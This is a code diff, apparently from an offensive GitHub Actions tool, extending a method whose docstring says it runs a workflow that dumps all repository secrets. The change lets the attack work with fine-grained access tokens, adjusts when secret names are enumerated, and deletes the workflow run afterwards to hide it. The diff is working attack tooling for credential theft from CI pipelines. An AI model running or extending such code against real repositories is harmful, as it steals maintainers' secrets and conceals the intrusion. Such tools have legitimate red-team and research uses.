@@ -163,6 +163,7 @@ EOF
         commit_message: str,
         delete_action: bool,
         yaml_name: str,
+        finegrain_scopes: set = None,
     ):
         """Given a user with write access to a repository, runs a workflow that
         dumps all repository secrets.
@@ -176,19 +177,27 @@ EOF
             yaml_name (str): Name of yaml to use for exfil workflow.
 
         """
+        if finegrain_scopes is None:
+            finegrain_scopes = []
         await self.setup_user_info()
 
         if not self.user_perms:
             return False
-
         if (
             "repo" in self.user_perms["scopes"]
             and "workflow" in self.user_perms["scopes"]
+        ) or (
+            "workflows:write" in finegrain_scopes
+            and "contents:write" in finegrain_scopes
         ):
-            secret_names = await self.__collect_secret_names(target_repo)
-
-            if not secret_names:
-                return False
+            # Only list secrets if we are not doing fine-grained PAT attack
+            if not finegrain_scopes or "secrets:read" in finegrain_scopes:
+                secret_names = await self.__collect_secret_names(target_repo)
+                if not secret_names:
+                    Output.warn("No accessible secrets to exfiltrate, not attempting!")
+                    return False
+            else:
+                Output.info("Skipping secret enumeration for fine-grained PAT attack.")
 
             # Randomly generate a branch name, since this will run immediately
             if target_branch:
@@ -232,7 +241,9 @@ EOF
                             print(f"{k}={v}")
                 else:
                     Output.error("Unexpected run artifact structure!")
-            if delete_action:
+            if delete_action and (
+                not finegrain_scopes or "actions:write" in finegrain_scopes
+            ):
                 res = await self.api.delete_workflow_run(target_repo, workflow_id)
                 if not res:
                     Output.error("Failed to delete workflow!")
